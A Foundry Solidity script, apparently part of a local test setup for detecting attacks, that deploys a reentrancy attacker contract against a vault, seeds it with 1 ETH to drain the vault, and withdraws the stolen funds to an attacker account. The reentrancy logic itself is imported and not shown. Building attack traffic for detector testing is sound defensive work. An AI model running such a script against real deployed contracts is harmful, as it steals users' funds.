// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../src/attacker/ReentrancyAttacker.sol";

/**
 * @title ExecuteAttack
 * @notice Phase 3: ~15 attack transactions.
 *         Deploy attacker + attack in same broadcast (same block on Anvil).
 *         Then withdraw stolen funds to attacker EOA.
 */
contract ExecuteAttack is Script {
    function run() external {
        address vaultAddr = vm.envAddress("VAULT_ADDRESS");
        uint256 attackerKey = vm.envUint("ATTACKER_KEY");

        // Deploy and attack in same broadcast — tests same_block_deploy_and_attack signal
        vm.startBroadcast(attackerKey);

        ReentrancyAttacker attacker = new ReentrancyAttacker(vaultAddr);
        console.log("Attacker deployed at:", address(attacker));

        // Attack with 1 ETH seed — reentrancy drains entire vault
        attacker.attack{value: 1 ether}();
        console.log("Reentrancy attack executed");

        // Withdraw stolen funds from attacker contract to EOA
        attacker.withdraw();
        console.log("Funds withdrawn to attacker EOA");

        vm.stopBroadcast();
    }
}
